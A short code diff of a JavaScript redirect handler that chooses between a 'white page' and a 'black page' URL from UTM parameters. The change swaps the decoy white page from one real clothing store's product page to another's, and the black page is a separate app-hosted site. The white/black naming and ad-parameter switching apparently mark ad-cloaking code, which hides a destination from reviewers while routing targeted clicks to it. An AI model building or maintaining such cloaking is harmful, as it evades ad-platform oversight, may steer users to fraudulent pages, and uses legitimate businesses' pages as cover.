@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.minifashionista.net.au/shop/custom-school-bags-libary-bags-and-lunch-boxes/copy-of-custom-all-over-butterfly-printed-backpack/";
+    const whitePageURL = "https://frankanddollys.com/collections/paloma/products/paloma-midi-dress";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
